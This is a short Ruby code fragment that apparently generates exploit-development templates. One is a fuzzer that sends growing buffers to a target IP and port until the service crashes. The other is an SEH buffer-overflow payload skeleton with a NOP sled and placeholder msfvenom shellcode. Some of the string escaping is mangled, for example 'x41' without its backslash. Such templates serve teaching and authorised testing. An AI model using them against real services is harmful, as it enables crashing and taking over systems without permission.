
def get_remote_content
"#!/usr/bin/ruby

# Basic buffer overflow Example
require 'socket'

# Get Argument Target IP and Port
target = ARGF.argv[0]
port   = ARGF.argv[1]

# Compact IP/Port
socket_addr = Socket.pack_sockaddr_in(port, target)

# Simple buffer of A's
buff = 'x41'*50

while true
  begin
    # Create new socket to connect C style
    s = Socket.new(:INET, :STREAM, 0)
    s.settimeout(2)

    # connect
    s.connect(socket_addr)
    s.recv(1024)

    puts "+'"Sending buffer with length #{buff.length.to_s}"'+"
    s.send("+'"User #{buff}rn", 0'+")
    s.close()
    sleep(1)
    buff = buff + 'x41'*50
  rescue
    puts "+'"[+] Crash occured with buffer length #{(buff.length - 50).to_s}"'+"
    exit
  end
end
"
end


def get_payload_content
"#!/usr/bin/ruby

# Basic Payload Example
filename = 'ENTER INFO'

# Generate using msfvenom
shellcode = ( )

OFFSET = #Enter NUM
BYTES  = #Enter NUM

SEH  = # Ex. '\xEB\x06\x90\x90'
nSEH = # Ex. '\x19\x76\x61\x61'
nops = " + '"\x90"' +" * 20 + shellcode

# Designed to deal with SEH (POP,POP,RET)
buffer = \"A\" * OFFSET + SEH + nSEH + nops + \"B\" * (BYTES - nops.length)
File.open(filename, 'w+') { |f| f.write(buffer) }
"
end
